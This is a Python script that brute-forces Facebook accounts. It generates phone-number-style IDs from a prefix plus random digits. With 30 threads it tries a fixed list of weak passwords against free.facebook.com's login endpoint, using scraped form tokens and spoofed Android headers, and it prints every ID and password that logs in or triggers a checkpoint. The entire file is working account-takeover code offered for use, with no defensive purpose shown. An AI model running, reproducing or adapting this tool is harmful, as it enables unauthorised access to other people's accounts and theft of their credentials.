# -*- coding:utf-8 -*-

# Name    : GIFT RANDOM SC
# Author  : HADI ANHAF AIMAN
# Create  : 11 May 2024 2:44 PM

import os
import re
import sys
import time
import json
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor as tani

class rand():
    def __init__(self,num,limit):
        self.loop = 0
        self.num = num
        self.limit = limit
        self.oks = []
        self.bou = []
        self.gen()
    def gen(self):
        genx = int(self.limit)
        for a in range(genx):
            jan = "".join(random.choice(string.digits) for _ in range(8))
            self.bou.append(jan)
        with tani(max_workers=30) as tanisha:
            for love in self.bou:
                ids = self.num + love
                pasx = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],'77889900','09876543','bangla','i love you']
                tanisha.submit(self.crack,ids,pasx)
    def crack(self,ids,pasx):
        global loop,oks
        sys.stdout.write(f'\r [{self.loop}/OK]•⟨{len(self.oks)}\r')
        sys.stdout.flush()
        try:
            for pas in pasx:
                session = requests.Session()
                xs = requests.get("https://free.facebook.com").text
                data = {
                    "m_ts":re.search('name="m_ts" value="(.*?)"', str(xs)).group(1),
                    "li":re.search('name="li" value="(.*?)"', str(xs)).group(1),
                    "try_number":0,
                    "unrecognized_tries":0,
                    "email":ids,
                    "prefill_contact_point":"",
                    "prefill_source":"",
                    "prefill_type":"",
                    "first_prefill_source":"",
                    "first_prefill_type":"",
                    "had_cp_prefilled":False,
                    "had_password_prefilled":False,
                    "is_smart_lock":False,
                    "bi_xrwh":0,
                    'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"', str(xs)).group(1), pas),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(xs)).group(1),
                    "lsd":re.search('name="lsd" value="(.*?)"', str(xs)).group(1),
                    "__dyn":"",
                    "__csr":"",
                    "__req":random.choice(["1","2","3","4","5","6","7","8","9","0"]),
                    "__a":"",
                    "__user":0
                }
                headers = {
                    'Host': 'free.facebook.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dpr': '1.7125',
                    'origin': 'https://free.facebook.com',
                    'referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=739959012779189&kid_directed_site=0&app_id=739959012779189&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D739959012779189%26redirect_uri%3Dhttps%253A%252F%252Fauth.fastwork.id%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf7eebb-e161-409b-a6ff-ce160c7a328f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.fastwork.id%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"12.0.0"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918W Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.67 Mobile Safari/537.36',
                    'viewport-width': '421',
                    'x-asbd-id': '129477',
                    'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(xs)).group(1),
                    'x-requested-with': 'XMLHttpRequest',
                    'x-response-format': 'JSONStream',
                }
                lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False).text
                log_cookies=session.cookies.get_dict().keys()
                if "c_user" in log_cookies:
                    cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid = re.findall('c_user=(.*);xs', cookie)[0]
                    print("\r\x1b[38;5;46m NEON-OK • %s • %s\x1b[m"%(uid,pas))
                    self.oks.append(uid)
                    break
                elif "checkpoint" in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    idf = "1000"+coki1[0:11]
                    print("\r\x1b[38;5;208m NEON-CP • %s • %s\x1b[m"%(idf,pas))
                    break 
                else:continue
            self.loop+=1
        except Exception as e:pass

if __name__ == "__main__":
    os.system('clear')
    num = sys.argv[1]
    lim = sys.argv[2]
    rand(num,lim)
